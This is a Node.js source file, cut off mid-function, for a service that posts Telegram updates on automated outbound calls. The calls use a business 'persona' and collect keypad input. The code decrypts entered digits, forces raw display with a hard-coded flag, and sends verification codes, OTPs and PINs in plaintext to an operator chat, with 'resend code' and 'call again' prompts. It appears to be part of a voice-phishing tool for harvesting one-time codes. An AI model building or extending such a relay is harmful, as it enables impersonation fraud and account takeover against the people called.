const axios = require('axios');
const {
  formatSummary,
  decryptDigits,
  getStageDefinition,
  normalizeStage,
  isSensitiveStage,
} = require('../utils/dtmf');

function parseDtmfMetadata(metadata) {
  if (!metadata) {
    return {};
  }
  if (typeof metadata === 'object' && !Array.isArray(metadata)) {
    return metadata;
  }
  try {
    return JSON.parse(metadata);
  } catch (error) {
    console.warn('Failed to parse DTMF metadata payload:', error.message);
    return { raw: metadata };
  }
}

function parseCallMetadata(metadata) {
  if (!metadata) {
    return null;
  }
  if (typeof metadata === 'object') {
    return metadata;
  }
  try {
    return JSON.parse(metadata);
  } catch (error) {
    console.warn('Failed to parse call metadata payload:', error.message);
    return null;
  }
}

function parseBusinessContext(raw) {
  if (!raw) {
    return null;
  }
  if (typeof raw === 'object') {
    return raw;
  }
  try {
    return JSON.parse(raw);
  } catch (error) {
    console.warn('Failed to parse business context payload:', error.message);
    return null;
  }
}

function parseStateData(payload) {
  if (!payload) {
    return {};
  }
  if (typeof payload === 'object') {
    return payload;
  }
  try {
    return JSON.parse(payload);
  } catch (error) {
    console.warn('Failed to parse call state payload:', error.message);
    return {};
  }
}

function getStageLabelFromMetadata(metadata = {}, stageKey = '') {
  if (!stageKey) {
    return null;
  }
  const normalized = normalizeStage(stageKey);
  const sequence = Array.isArray(metadata?.input_sequence) ? metadata.input_sequence : [];
  const match = sequence.find((entry) => normalizeStage(entry.stage || entry.stage_key || entry.label || '') === normalized);
  return match?.label || match?.name || normalized.replace(/_/g, ' ');
}

function getPersonaLabel(call) {
  if (!call) {
    return 'Keypad Alert';
  }
  const context = parseBusinessContext(call.business_context);
  return (
    context?.persona?.businessDisplayName ||
    context?.businessDisplayName ||
    context?.companyName ||
    call.business_function ||
    'Keypad Alert'
  );
}

function getFallbackInputLabel(call) {
  const metadata = parseCallMetadata(call?.metadata_json) || {};
  const sequence = Array.isArray(metadata?.input_sequence) ? metadata.input_sequence : [];
  if (sequence.length > 0) {
    return sequence[0].label || sequence[0].stage || 'Input';
  }
  return 'Input';
}

function getCustomerName(call, metadata = {}) {
  return (
    metadata.customer_name ||
    metadata.client_name ||
    call?.customer_name ||
    call?.client_name ||
    'Client'
  );
}

function determineCallScenario(call, metadata = {}) {
  const explicitType = (call?.call_type || '').toLowerCase();
  if (
    metadata.enable_secure_inputs ||
    metadata.expected_otp ||
    metadata.require_pin ||
    metadata.secure_profile ||
    explicitType === 'verification'
  ) {
    return 'verification';
  }
  if (explicitType === 'collect_input' || (Array.isArray(metadata.input_sequence) && metadata.input_sequence.length)) {
    return 'information';
  }
  return 'general';
}

function formatLocalTimestamp(value = null) {
  try {
    return new Date(value || Date.now()).toLocaleTimeString();
  } catch (error) {
    return new Date().toLocaleTimeString();
  }
}

const HUMAN_AMD_VALUES = new Set(['human', 'person', 'live', 'positive_human', 'human_answered', 'human_answer', 'amd_human']);
const MACHINE_AMD_VALUES = new Set(['machine', 'machine_start', 'fax', 'positive_machine', 'unknown_machine', 'answering_machine', 'automated', 'machine_answered', 'amd_machine']);

function maskPhoneNumber(phone = '') {
  if (!phone) {
    return 'Unknown';
  }
  const trimmed = phone.toString().trim();
  if (trimmed.length <= 6) {
    return trimmed;
  }
  const prefix = trimmed.slice(0, 2);
  const suffix = trimmed.slice(-4);
  const maskLength = Math.max(1, trimmed.length - (prefix.length + suffix.length));
  return `${prefix}${'•'.repeat(maskLength)}${suffix}`;
}

function formatDurationShort(seconds = 0) {
  const total = Number(seconds) || 0;
  if (total <= 0) {
    return '0s';
  }
  const mins = Math.floor(total / 60);
  const secs = total % 60;
  if (mins === 0) {
    return `${secs}s`;
  }
  return `${mins}m ${secs.toString().padStart(2, '0')}s`;
}

function formatAnsweredLabel(value) {
  if (!value) {
    return 'unknown';
  }
  const normalized = value.toString().trim().toLowerCase();
  if (HUMAN_AMD_VALUES.has(normalized)) {
    return 'human';
  }
  if (MACHINE_AMD_VALUES.has(normalized)) {
    return 'machine';
  }
  return normalized.replace(/_/g, ' ') || 'unknown';
}

function formatDtmfEntries(entries = []) {
  const revealRaw = true;
  return entries.map((entry) => {
    const stageKey = normalizeStage(entry.stage_key || 'generic');
    const metadata = parseDtmfMetadata(entry.metadata);
    const stageDefinition = getStageDefinition(stageKey);
    const decrypted = entry.encrypted_digits ? decryptDigits(entry.encrypted_digits) : null;
    const rawDigits = revealRaw ? (decrypted || metadata.raw_digits_preview || null) : null;
    const fallbackDigits = metadata.raw_digits_preview || entry.masked_digits;
    const label = metadata.stage_label || stageDefinition.label || stageKey || 'Entry';
    return {
      id: entry.id,
      call_sid: entry.call_sid,
      stage_key: stageKey,
      label,
      digits: rawDigits || fallbackDigits,
      raw_digits: rawDigits || null,
      masked_digits: entry.masked_digits,
      received_at: entry.received_at,
      compliance_mode: entry.compliance_mode,
      provider: entry.provider,
      metadata,
    };
  });
}

function sanitizeTelegramText(message = '') {
  const raw = message == null ? '' : String(message);
  return raw
    .replace(/\r\n/g, '\n')
    .replace(/\r/g, '\n')
    .replace(/<br\s*\/?/gi, '\n')
    .replace(/\u2028|\u2029/g, '\n')
    .replace(/[\x00-\x08\x0B\x0C\x0E-\x1F]/g, '')
    .replace(/&(?!amp;|lt;|gt;|quot;)/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/\n{3,}/g, '\n\n')
    .trim();
}

function buildTelegramMessage(lines = []) {
  return lines.filter(Boolean).join('\n');
}

function isSensitiveDtmf(entries = []) {
  return entries.some((entry) => isSensitiveStage(entry.stage_key));
}

function normalizeSequenceStageKey(stage = {}) {
  const token = stage?.stage || stage?.stage_key || stage?.label || 'GENERIC';
  return normalizeStage(token);
}

function formatMissingInputLabel(label = 'input') {
  const clean = label
    .toString()
    .replace(/[^a-z0-9\s-]/gi, '')
    .trim()
    .toLowerCase();
  return clean || 'input';
}

function collectInputLines(metadata = {}, entries = [], options = {}) {
  const { includeMissing = false } = options;
  const sequence = Array.isArray(metadata?.input_sequence) ? metadata.input_sequence : [];
  const capturedStages = new Map();
  const stageOrder = [];

  entries.forEach((entry) => {
    const entryMetadata = parseDtmfMetadata(entry.metadata);
    const stageToken = entryMetadata.stage_key || entry.stage_key || entryMetadata.stage || entryMetadata.label || '';
    const stageKey = normalizeStage(stageToken || 'GENERIC');
    const sequenceDefinition = sequence.find((stage) => normalizeSequenceStageKey(stage) === stageKey);
    const fallbackDefinition = getStageDefinition(stageKey);
    const label =
      entryMetadata.stage_label ||
      sequenceDefinition?.label ||
      fallbackDefinition.label ||
      entry.stage_key ||
      'Entry';
    const digits = decryptDigits(entry.encrypted_digits) || entryMetadata.raw_digits_preview || entry.masked_digits || '';
    if (!digits) {
      return;
    }
    if (!capturedStages.has(stageKey)) {
      stageOrder.push(stageKey);
    }
    capturedStages.set(stageKey, { label, value: digits });
  });

  const lines = [];
  if (sequence.length) {
    sequence.forEach((stage) => {
      const normalizedStageKey = normalizeSequenceStageKey(stage);
      const label = stage.label || stage.stage || stage.stage_key || getStageDefinition(normalizedStageKey).label || 'Entry';
      const captured = capturedStages.get(normalizedStageKey);
      if (captured && captured.value) {
        lines.push(`${label}: ${captured.value}`);
      } else if (includeMissing) {
        lines.push(`${label}: No ${formatMissingInputLabel(label)} entered`);
      }
    });
  } else if (capturedStages.size) {
    stageOrder.forEach((stageKey) => {
      const captured = capturedStages.get(stageKey);
      if (captured?.value) {
        lines.push(`${captured.label}: ${captured.value}`);
      }
    });
  }

  if (!lines.length && !sequence.length && includeMissing) {
    lines.push('No keypad input was captured for this call.');
  }

  const hasValues = Array.from(capturedStages.values()).some((entry) => Boolean(entry.value));
  return { lines, hasValues };
}

function escapeMarkdownV2(text = '') {
  return String(text)
    .replace(/\\/g, '\\\\')
    .replace(/([_*\[\]()~`>#+\-=|{}.!])/g, '\\$1');
}

function titleCase(value = '') {
  return value
    .toString()
    .split(/[\s_-]+/)
    .filter(Boolean)
    .map((word) => word.charAt(0).toUpperCase() + word.slice(1).toLowerCase())
    .join(' ');
}

function resolveIntentLabel(call = {}, metadata = {}) {
  const context = parseBusinessContext(call.business_context);
  return (
    metadata.intent ||
    metadata.call_intent ||
    call.business_function ||
    context?.businessType ||
    metadata.purpose ||
    'General'
  );
}

function extractSentimentInfo(analysisRaw) {
  if (!analysisRaw) {
    return { label: 'neutral', emoji: '😐' };
  }
  let analysis = analysisRaw;
  if (typeof analysisRaw === 'string') {
    try {
      analysis = JSON.parse(analysisRaw);
    } catch (error) {
      analysis = {};
    }
  }
  const sentiment = (analysis?.sentiment || analysis?.analysis?.sentiment || 'neutral').toLowerCase();
  if (sentiment.includes('pos')) {
    return { label: 'positive', emoji: '🙂' };
  }
  if (sentiment.includes('neg')) {
    return { label: 'negative', emoji: '⚠️' };
  }
  return { label: 'neutral', emoji: '😐' };
}

function describeDualChannelIssue(issue = {}) {
  if (!issue || !issue.status) {
    return null;
  }
  if (issue.status === 'mismatch') {
    return `${issue.label || 'Secondary check'} mismatch`;
  }
  if (issue.status === 'missing_reference') {
    return `${issue.label || 'Secondary check'} reference missing`;
  }
  return `${issue.label || 'Secondary check'} alert`;
}

function formatStatusMeta(status, callTiming = {}, additionalData = {}) {
  const normalized = (status || '').toLowerCase();
  const meta = {
    emoji: '📞',
    label: titleCase(normalized || 'Call Update'),
    detail: 'Monitoring call status…'
  };

  switch (normalized) {
    case 'initiated':
    case 'queued':
      meta.emoji = '📞';
      meta.detail = 'Dialing the customer…';
      break;
    case 'ringing': {
      meta.emoji = '🔔';
      meta.detail = 'Ringing…';
      if (callTiming.initiated) {
        const ringDelay = ((new Date() - callTiming.initiated) / 1000).toFixed(1);
        if (ringDelay > 0) {
          meta.detail += ` (${ringDelay}s)`;
        }
      }
      callTiming.ringing = new Date();
      break;
    }
    case 'in-progress':
    case 'answered':
      meta.emoji = '☎️';
      meta.detail = 'Live conversation in progress.';
      callTiming.answered = new Date();
      break;
    case 'completed': {
      meta.emoji = '🏁';
      const durationSeconds = additionalData.duration || (callTiming.answered ? ((new Date() - callTiming.answered) / 1000).toFixed(0) : null);
      meta.detail = durationSeconds && durationSeconds > 3
        ? `Call completed (${formatDurationShort(durationSeconds)})`
        : 'Call completed.';
      break;
    }
    case 'busy':
      meta.emoji = '📵';
      meta.detail = 'Line busy.';
      break;
    case 'no-answer':
    case 'no_answer':
      meta.emoji = '❌';
      meta.detail = 'No answer — call attempt completed.';
      break;
    case 'failed':
      meta.emoji = '❌';
      meta.detail = additionalData.error_message
        ? `Call failed: ${additionalData.error_message}`
        : 'Call failed.';
      break;
    case 'canceled':
      meta.emoji = '🚫';
      meta.detail = 'Call was canceled.';
      break;
    default:
      meta.detail = titleCase(normalized || 'update');
  }

  if (additionalData.error_message && normalized !== 'failed') {
    meta.detail += ` (${additionalData.error_message})`;
  }

  return meta;
}

class EnhancedWebhookService {
  constructor() {
    this.isRunning = false;
    this.interval = null;
    this.db = null;
    this.telegramBotToken = process.env.TELEGRAM_BOT_TOKEN;
    this.processInterval = 3000; // Check every 3 seconds for faster updates
    this.activeCallStatus = new Map(); // Track call status to avoid duplicates
    this.callThreads = new Map(); // Track Telegram master message threads
    this.callTimestamps = new Map(); // Track call timing for better status management
    this.statusOrder = ['queued', 'initiated', 'ringing', 'in-progress', 'answered', 'completed', 'busy', 'no-answer', 'failed', 'canceled'];
  }

  start(database) {
    this.db = database;
    
    if (!this.telegramBotToken) {
      console.warn('TELEGRAM_BOT_TOKEN not configured. Enhanced webhook service disabled.'.yellow);
      return;
    }

    if (this.isRunning) {
      console.log('Enhanced webhook service is already running');
      return;
    }

    this.isRunning = true;
    console.log('🚀 Starting enhanced webhook service with no-answer detection...'.green);
    
    // Start processing notifications
    this.interval = setInterval(() => {
      this.processNotifications();
    }, this.processInterval);

    // Process immediately
    this.processNotifications();
    
    // Cleanup old call data every 30 minutes
    setInterval(() => {
      this.cleanupOldCallData();
    }, 30 * 60 * 1000);
  }

  stop() {
    if (this.interval) {
      clearInterval(this.interval);
      this.interval = null;
    }
    this.isRunning = false;
    this.activeCallStatus.clear();
    this.callThreads.clear();
    this.callTimestamps.clear();
    console.log('Enhanced webhook service stopped'.yellow);
  }

  // Track call progression and prevent out-of-order status updates
  shouldSendStatus(call_sid, newStatus) {
    const currentStatusInfo = this.activeCallStatus.get(call_sid);
    
    if (!currentStatusInfo) {
      // First status for this call
      this.activeCallStatus.set(call_sid, {
        lastStatus: newStatus,
        timestamp: new Date(),
        statusHistory: [newStatus]
      });
      return true;
    }

    const { lastStatus, statusHistory } = currentStatusInfo;
    
    // Don't send duplicate status
    if (lastStatus === newStatus) {
      console.log(`⏭️ Skipping duplicate status ${newStatus} for call ${call_sid}`.gray);
      return false;
    }

    // Check if this is a valid status progression
    const currentIndex = this.statusOrder.indexOf(lastStatus);
    const newIndex = this.statusOrder.indexOf(newStatus);

    // Allow backwards progression for failure states
    const failureStates = ['busy', 'no-answer', 'failed', 'canceled'];
    const isFailureTransition = failureStates.includes(newStatus);
    
    // Allow progression if moving forward or transitioning to failure state
    if (newIndex > currentIndex || isFailureTransition) {
      // Update status tracking
      currentStatusInfo.lastStatus = newStatus;
      currentStatusInfo.timestamp = new Date();
      currentStatusInfo.statusHistory.push(newStatus);
      this.activeCallStatus.set(call_sid, currentStatusInfo);
      return true;
    }

    console.log(`⏭️ Skipping out-of-order status ${newStatus} (current: ${lastStatus}) for call ${call_sid}`.gray);
    return false;
  }

  async processNotifications() {
    if (!this.db || !this.telegramBotToken) return;

    if (!this.db.isInitialized) {
      return;
    }

    try {
      const notifications = await this.db.getEnhancedPendingWebhookNotifications(50);
      
      if (notifications.length === 0) return;

      for (const notification of notifications) {
        try {
          await this.sendNotification(notification);
          // Small delay between notifications to prevent rate limiting
          await this.delay(150);
        } catch (error) {
          console.error(`❌ Failed to send notification ${notification.id}:`, error.message);
        }
      }
    } catch (error) {
      console.error('❌ Error processing notifications:', error);
    }
  }

  // Enhanced call status update with proper no-answer detection
  async sendCallStatusUpdate(call_sid, status, telegram_chat_id, additionalData = {}) {
    try {
      if (!this.shouldSendStatus(call_sid, status)) {
        return true;
      }

      if (!this.callTimestamps.has(call_sid)) {
        this.callTimestamps.set(call_sid, { started: new Date() });
      }
      const callTiming = this.callTimestamps.get(call_sid);
      const normalizedStatus = status.toLowerCase();
      const statusMeta = formatStatusMeta(normalizedStatus, callTiming, additionalData);
      const callDetails = await this.db.getCall(call_sid);
      const metadata = parseCallMetadata(callDetails?.metadata_json) || {};
      const chatId = telegram_chat_id || callDetails?.telegram_chat_id;

      if (!chatId) {
        console.warn(`No Telegram chat configured for call ${call_sid}; skipping status update.`);
        return true;
      }

      const personaLabel = callDetails ? getPersonaLabel(callDetails) : 'Adaptive Agent';
      const intentLabel = resolveIntentLabel(callDetails || {}, metadata);
      const sentimentInfo = extractSentimentInfo(callDetails?.ai_analysis);

      await this.updateCallThread(call_sid, chatId, {
        customer: {
          name: getCustomerName(callDetails, metadata),
          phone: callDetails?.phone_number || metadata?.dialed_number || null
        },
        persona: personaLabel,
        intent: intentLabel,
        sentiment: sentimentInfo,
        status: statusMeta,
        provider: callDetails?.provider || 'UNKNOWN',
        summary: normalizedStatus === 'completed'
          ? (callDetails?.call_summary || additionalData.summary || null)
          : undefined
      }, callDetails);

      if (this.db && this.db.logNotificationMetric) {
        await this.db.logNotificationMetric(`call_${normalizedStatus}`, true);
      }

      if (['completed', 'failed', 'no-answer', 'no_answer', 'busy', 'canceled'].includes(normalizedStatus)) {
        setTimeout(() => {
          this.cleanupCallData(call_sid);
        }, 5 * 60 * 1000);
      }

      return true;
    } catch (error) {
      console.error('❌ Failed to send enhanced call status update:', error);
      if (this.db && this.db.logNotificationMetric) {
        await this.db.logNotificationMetric(`call_${status.toLowerCase()}`, false);
      }
      return false;
    }
  }

  // Enhanced transcript sending with better formatting
  async sendCallTranscript(call_sid, telegram_chat_id) {
    try {
      const callDetails = await this.db.getCall(call_sid);
      const transcripts = await this.db.getCallTranscripts(call_sid);
      const dtmfEntries = await this.db.getCallDtmfEntries(call_sid);
      const formattedDtmf = formatDtmfEntries(dtmfEntries);
      const dtmfSummary = dtmfEntries.length ? formatSummary(dtmfEntries) : { summaryLines: [], containsRaw: false };
      
      if (!callDetails || !transcripts || transcripts.length === 0) {
        await this.sendTelegramMessage(telegram_chat_id, buildTelegramMessage([
          '📋 No transcript available for this call'
        ]));
        return true;
      }

      const lines = [];
      lines.push('📋 Call Transcript');
      lines.push('');
      lines.push(`Phone: ${callDetails.phone_number || 'Unknown'}`);

      if (callDetails.duration && callDetails.duration > 0) {
        const minutes = Math.floor(callDetails.duration / 60);
        const seconds = callDetails.duration % 60;
        lines.push(`Duration: ${minutes}:${String(seconds).padStart(2, '0')}`);
      }

      if (callDetails.started_at) {
        const startTime = new Date(callDetails.started_at).toLocaleTimeString();
        lines.push(`Time: ${startTime}`);
      }

      lines.push(`Messages: ${transcripts.length}`);

      if (callDetails.status) {
        const statusEmoji = this.getStatusEmoji(callDetails.status);
        lines.push(`Status: ${statusEmoji} ${callDetails.status}`);
      }

      if (formattedDtmf.length > 0) {
        lines.push('');
        lines.push('Keypad Entries:');
        dtmfSummary.summaryLines.forEach((line) => lines.push(`• ${line}`));
      }

      lines.push('');
      lines.push('Conversation:');

      const maxMessages = 12;
      for (let i = 0; i < Math.min(transcripts.length, maxMessages); i++) {
        const entry = transcripts[i];
        const speakerLabel = entry.speaker === 'user' ? '👤 Customer' : '🤖 AI';
        const timestamp = entry.timestamp ? new Date(entry.timestamp).toLocaleTimeString() : null;
        const messageText = entry.clean_message || entry.message || entry.raw_message || '';
        const body = messageText.split('\n').map((line) => line.trim()).filter(Boolean).join('\n');
        lines.push(timestamp ? `${speakerLabel} (${timestamp}):` : `${speakerLabel}:`);
        lines.push(body);
      }

      if (transcripts.length > maxMessages) {
        lines.push(`… and ${transcripts.length - maxMessages} more messages`);
        lines.push(`Use /transcript ${call_sid} for full details.`);
      }

      if (callDetails.call_summary) {
        lines.push('');
        lines.push('Summary:');
        lines.push(callDetails.call_summary);
      }

      const messageText = buildTelegramMessage(lines);

      if (messageText.length > 4000) {
        const chunks = this.splitMessage(messageText, 3900);
        for (let i = 0; i < chunks.length; i++) {
          await this.sendTelegramMessage(telegram_chat_id, chunks[i]);
          if (i < chunks.length - 1) {
            await this.delay(1500);
          }
        }
      } else {
        await this.sendTelegramMessage(telegram_chat_id, messageText);
      }

      console.log(`✅ Sent enhanced transcript for call ${call_sid}`.green);

      if (this.db && this.db.logNotificationMetric) {
        await this.db.logNotificationMetric('call_transcript', true);
      }

      return true;

    } catch (error) {
      console.error('❌ Failed to send enhanced call transcript:', error);

      if (this.db && this.db.logNotificationMetric) {
        await this.db.logNotificationMetric('call_transcript', false);
      }

      try {
        await this.sendTelegramMessage(telegram_chat_id, '❌ Error retrieving call transcript');
      } catch (fallbackError) {
        console.error('Failed to send error message:', fallbackError);
      }

      return false;
    }
  }

  async sendCallInputNotification(call_sid, telegram_chat_id) {
    try {
      const [entries, callDetails] = await Promise.all([
        this.db.getCallDtmfEntries(call_sid),
        this.db.getCall(call_sid),
      ]);

      const metadata = parseCallMetadata(callDetails?.metadata_json) || {};
      const scenario = determineCallScenario(callDetails, metadata);
      const customerName = getCustomerName(callDetails, metadata);
      const timestamp = formatLocalTimestamp();
      const structuredSummary = collectInputLines(metadata, entries || [], { includeMissing: true });
      let replyMarkup = null;

      const header =
        scenario === 'verification'
          ? '⚠️ Verification Input'
          : scenario === 'information'
            ? '📝 Information Captured'
            : '📞 Call Completed';

      let message = `*${escapeMarkdownV2(header)}*\n`;
      message += `*Client:* ${escapeMarkdownV2(customerName)}\n`;
      message += `*Time:* ${escapeMarkdownV2(timestamp)}\n`;

      if (scenario !== 'general' && structuredSummary.lines.length) {
        message += `\n*Details*\n`;
        structuredSummary.lines.forEach((line) => {
          message += `• ${escapeMarkdownV2(line)}\n`;
        });
        replyMarkup = this.buildCallFollowUpKeyboard(call_sid, 'completed', {
          allowTranscript: true,
          callAgainPrompt: true,
        });
      } else {
        message += `\n_${escapeMarkdownV2('No keypad input was required for this call.')}_\n`;
        replyMarkup = this.buildOutcomeFollowUpKeyboard(call_sid, {
          allowCallAgain: true,
        });
      }

      await this.sendTelegramMessage(telegram_chat_id, message.trim(), 'MarkdownV2', replyMarkup);

      if (this.db && this.db.logNotificationMetric) {
        await this.db.logNotificationMetric('call_input_dtmf', true);
      }
      return true;
    } catch (error) {
      console.error('❌ Failed to send keypad input notification:', error);
      if (this.db && this.db.logNotificationMetric) {
        await this.db.logNotificationMetric('call_input_dtmf', false);
      }
      try {
        await this.sendTelegramMessage(telegram_chat_id, '❌ Error delivering keypad entry details');
      } catch (fallbackError) {
        console.error('Failed to send fallback keypad message:', fallbackError);
      }
      return false;
    }
  }

  async sendCallStepNotification(call_sid, telegram_chat_id, options = {}) {
    try {
      const [latestState, callDetails] = await Promise.all([
        this.db.getLatestCallState(call_sid, 'dtmf_verified'),
        this.db.getCall(call_sid),
      ]);

      if (!latestState || !callDetails) {
        return true;
      }

      const stateData = parseStateData(latestState.data);
      const metadata = parseCallMetadata(callDetails.metadata_json) || {};
      const personaLabel = getPersonaLabel(callDetails);
      const customerName = getCustomerName(callDetails, metadata);
      const scenario = determineCallScenario(callDetails, metadata);
      const timestamp = formatLocalTimestamp(latestState.timestamp);
      const stageKey = stateData.stage_key || stateData.stageKey;
      const stageLabel =
        stateData.stage_label ||
        getStageLabelFromMetadata(metadata, stageKey) ||
        (stageKey ? stageKey.replace(/_/g, ' ') : 'Verification');
      const digits = stateData.digits_preview || stateData.digits || 'None';
      const attempts = stateData.attempts || 1;
      const needsRetry = options.isRetry || Boolean(stateData.needs_retry) || ['mismatch', 'length_mismatch', 'value_mismatch'].includes(stateData.verification);
      const nextStageLabel = stateData.next_stage_key
        ? getStageLabelFromMetadata(metadata, stateData.next_stage_key) || stateData.next_stage_key.replace(/_/g, ' ')
        : null;
      const workflowComplete = Boolean(stateData.workflow_completed);
      const clarificationPrompt = stateData.clarification_prompt || '';
      const offerSpeech = Boolean(stateData.offer_speech);
      const confirmDigits = Boolean(stateData.confirm_digits);
      const issueList = Array.isArray(stateData.detected_issues)
        ? stateData.detected_issues
        : stateData.detected_issues
          ? [stateData.detected_issues]
          : [];
      const dualChannelInfo =
        typeof stateData.dual_channel === 'string'
          ? (() => {
              try {
                return JSON.parse(stateData.dual_channel);
              } catch (error) {
                return null;
              }
            })()
          : stateData.dual_channel;

      const secureInput = {
        stageLabel,
        value: digits === 'None' ? null : digits,
        attempts,
        needsRetry,
        nextStage: nextStageLabel,
        timestamp,
        clarification: clarificationPrompt,
        offerSpeech,
        confirmDigits,
        issues: issueList,
        dualIssue: describeDualChannelIssue(dualChannelInfo?.issue),
        allowResend: /code|otp|passcode|pin/i.test(stageLabel || '')
      };

      await this.updateCallThread(call_sid, telegram_chat_id, {
        secureInput
      }, callDetails);

      if (this.db && this.db.logNotificationMetric) {
        const metric = options.isRetry ? 'call_step_retry' : 'call_step_complete';
        await this.db.logNotificationMetric(metric, true);
      }
      return true;
    } catch (error) {
      console.error('❌ Failed to process call step notification:', error);
      if (this.db && this.db.logNotificationMetric) {
        const metric = options.isRetry ? 'call_step_retry' : 'call_step_complete';
        await this.db.logNotificationMetric(metric, false);
      }
      return false;
    }
  }

  async sendCallWorkflowComplete(call_sid, telegram_chat_id) {
    try {
      const [callDetails, dtmfEntries] = await Promise.all([
        this.db.getCall(call_sid),
        this.db.getCallDtmfEntries(call_sid),
      ]);

      if (!callDetails) {
        return true;
      }

      const metadata = parseCallMetadata(callDetails.metadata_json) || {};
      const scenario = determineCallScenario(callDetails, metadata);
      const structuredSummary = collectInputLines(metadata, dtmfEntries || [], { includeMissing: true });
      const summaryText = structuredSummary.lines.length
        ? structuredSummary.lines.join('\n')
        : scenario === 'general'
          ? 'Call completed without keypad input.'
          : 'Secure input workflow marked complete.';

      await this.updateCallThread(call_sid, telegram_chat_id, {
        summary: summaryText,
        status: { emoji: '✅', label: 'Verification Complete', detail: 'Secure input workflow finished.' },
        secureInput: { workflowComplete: true }
      }, callDetails);
      return true;
    } catch (error) {
      console.error('❌ Failed to send workflow completion notification:', error);
      return false;
    }
  }

  async sendCallInputSummary(call_sid, telegram_chat_id) {
    try {
      const [inputs, callDetails, dtmfEntries] = await Promise.all([
        this.db.getCallInputs(call_sid),
        this.db.getCall(call_sid),
        this.db.getCallDtmfEntries(call_sid),
      ]);

      const metadata = parseCallMetadata(callDetails?.metadata_json) || {};
      const scenario = determineCallScenario(callDetails, metadata);
      const customerName = getCustomerName(callDetails, metadata);
      const syntheticEntries = [];
      const sequence = Array.isArray(metadata?.input_sequence) ? metadata.input_sequence : [];

      if (Array.isArray(inputs) && inputs.length) {
        inputs.forEach((input) => {
          if (!input.value) {
            return;
          }
          const stepIndex = typeof input.step === 'number' ? input.step - 1 : null;
          const stage = typeof stepIndex === 'number' ? sequence[stepIndex] : null;
          const label = stage?.label || `Step ${input.step}`;
          syntheticEntries.push({
            stage_key: stage?.stage || stage?.stage_key || label || `STEP_${input.step}`,
            metadata: {
              stage_label: label,
              raw_digits_preview: input.value,
            },
            masked_digits: input.value,
            encrypted_digits: null,
          });
        });
      }

      const combinedEntries = [...(dtmfEntries || []), ...syntheticEntries];
      const structuredSummary = collectInputLines(metadata, combinedEntries, {
        includeMissing: true,
      });

      const lines = [];
      if (scenario === 'verification') {
        lines.push('⚠️ Input Summary', '', 'Verification input received.');
        lines.push(`Client: ${customerName}`);
        lines.push('Call Type: Verification');
      } else if (scenario === 'information') {
        lines.push('⚠️ Input Summary', '', 'Requested information received.');
        lines.push(`Client: ${customerName}`);
        lines.push('Call Type: Information Collection');
      } else {
        lines.push('📞 Call Completed');
        lines.push(`Client: ${customerName}`);
        lines.push('No input was required for this call.');
      }

      if (structuredSummary.lines.length) {
        lines.push('');
        lines.push('Details:');
        structuredSummary.lines.forEach((entryLine) => lines.push(entryLine));
      }

      await this.sendTelegramMessage(telegram_chat_id, buildTelegramMessage(lines));
      return true;
    } catch (error) {
      console.error('❌ Failed to send call input summary:', error);
      try {
        await this.sendTelegramMessage(telegram_chat_id, '❌ Error delivering call input summary');
      } catch (fallbackError) {
        console.error('Failed to send fallback summary message:', fallbackError);
      }
      return false;
    }
  }

  async getLatestInputPreview(call_sid, call) {
    if (call?.latest_input_preview) {
      return call.latest_input_preview;
    }
    const entries = await this.db.getCallDtmfEntries(call_sid);
    if (!entries.length) {
      return null;
    }
    const latest = entries[entries.length - 1];
    const metadata = parseDtmfMetadata(latest.metadata);
    return decryptDigits(latest.encrypted_digits) || metadata.raw_digits_preview || latest.masked_digits || null;
  }

  async buildInputDetails(call_sid, metadata = null) {
    const [entries, callInputs] = await Promise.all([
      this.db.getCallDtmfEntries(call_sid),
      this.db.getCallInputs(call_sid),
    ]);

    let resolvedMetadata = metadata;
    if (!resolvedMetadata) {
      const callRecord = await this.db.getCall(call_sid);
      resolvedMetadata = parseCallMetadata(callRecord?.metadata_json) || {};
    }

    const sequence = Array.isArray(resolvedMetadata?.input_sequence) ? resolvedMetadata.input_sequence : [];
    const structured = collectInputLines(resolvedMetadata, entries || [], { includeMissing: false });
    const lines = [...structured.lines];

    if (!lines.length && callInputs.length) {
      callInputs.forEach((input) => {
        if (!input.value) {
          return;
        }
        const stepIndex = typeof input.step === 'number' ? input.step - 1 : null;
        const stage = typeof stepIndex === 'number' ? sequence[stepIndex] : null;
        const label = stage?.label || `Step ${input.step}`;
        lines.push(`${label}: ${input.value}`);
      });
    }

    if (!lines.length) {
      return null;
    }

    return {
      text: lines.join('\n'),
      multiline: lines.length > 1,
    };
  }

  async buildTranscriptPreview(call_sid, call) {
    if (call?.call_summary) {
      return call.call_summary.slice(0, 200);
    }

    const transcripts = await this.db.getCallTranscripts(call_sid);
    if (!transcripts.length) {
      return null;
    }

    const preview = transcripts
      .slice(0, 4)
      .map((entry) => entry.clean_message || entry.message || entry.raw_message || '')
      .filter(Boolean)
      .join(' ')
      .trim();

    return preview.slice(0, 220);
  }

  async sendCallOutcomeSummary(call_sid, telegram_chat_id) {
    try {
      const call = await this.db.getCall(call_sid);
      if (!call) {
        return true;
      }

      const maskedNumber = maskPhoneNumber(call.phone_number);
      const durationText = formatDurationShort(call.duration);
      const answeredLabel = formatAnsweredLabel(call.answered_by || call.amd_status);
      const outcome = (call.final_outcome || '').toUpperCase();
      const metadata = parseCallMetadata(call.metadata_json) || {};
      const scenario = determineCallScenario(call, metadata);
      const customerName = getCustomerName(call, metadata);
      const callTypeLabel =
        scenario === 'verification'
          ? 'Verification'
          : scenario === 'information'
            ? 'Information Collection'
            : 'Service';
      const failureStates = ['NO_ANSWER', 'BUSY', 'FAILED', 'CANCELED'];
      const inputDetails = await this.buildInputDetails(call_sid, metadata);
      const transcriptPreview = await this.buildTranscriptPreview(call_sid, call);
      const aiSummary = call.call_summary || call.ai_summary || null;
      const lines = [];

      if (failureStates.includes(outcome)) {
        if (outcome === 'NO_ANSWER') {
          lines.push('❌ Call Not Answered');
        } else if (outcome === 'BUSY') {
          lines.push('⚠️ Line Busy');
        } else if (outcome === 'FAILED') {
          lines.push('❌ Call Failed');
        } else if (outcome === 'CANCELED') {
          lines.push('🚫 Call Canceled');
        }
        lines.push(`Client: ${customerName}`);
        lines.push(`Number: ${maskedNumber}`);
        if (call.error_message) {
          lines.push(`Reason: ${call.error_message}`);
        }
      } else {
        lines.push('📞 Service Call Completed');
        lines.push(`Client: ${customerName}`);
        lines.push(`Answered by: ${answeredLabel}`);
        lines.push(`Duration: ${durationText}`);
        lines.push(`Call Type: ${callTypeLabel}`);
        if (inputDetails?.text) {
          lines.push('');
          lines.push('Collected Inputs:');
          lines.push(inputDetails.text);
